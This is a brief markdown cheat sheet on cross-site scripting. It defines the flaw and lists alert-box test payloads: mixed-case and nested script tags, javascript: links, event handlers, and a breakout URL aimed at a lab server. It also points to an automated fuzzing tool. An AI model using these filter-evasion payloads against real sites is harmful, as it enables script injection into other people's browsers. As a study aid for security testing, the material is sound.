### Definition.

XSS or CrossSiteScripting is a client-side vulnerability which involves the execution of malicious JavaScript code based on the reflexion of data given by the user (not properly sanitized) in the HTML response.
<br>

### CheatSheet.

This is a simply cheatsheet for XSS trigger.

Suppose we have an input point;

- Try: 

    ```html
    <script>alert(1)</script>
    ```

- Modify tags:

    ```html
    <sCrIpT>alert(1)</ScRiPt>
    ```

- Repeat tags:

    ```html
    <scr<script>ipt>alert(1)</scr</script>ipt>
    ```

- Research to find another way to execute javascript, through other tags, events, etc, avoiding using keywords as script:

    ```html
    <a hef="javascript:alert(1)">
    <IMG src=x onmouseover="alert('xxs')">
    ```

    Other techniques would involve using **eval and String.fromCharCode()**, **prompt** or **confirm** to make a payload that trigger an alert box with out using alert keyword.

    There is a complete cheatsheet on the following ![link](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

- Check HTML response code if you can bypass HTML response counter measures to javascript injection:

    ```text
    http://172.16.66.128/xss/example6.php?name=";</script><script>alert(1)</script>
    ```
    
    ```html
    Hello 
    <script>
	    var $a= "";</script><script>alert(1)</script>";
    </script>
    ```

- See if, among the entry point, there exists others things within the HTTP request that are being include in the html of the response, for example, the URL trying to be accesed by the user.

- In the last thing, you can use an automated tool (![XSStrike](https://github.com/s0md3v/XSStrike)) in order to launch a dictionary attack against an input point.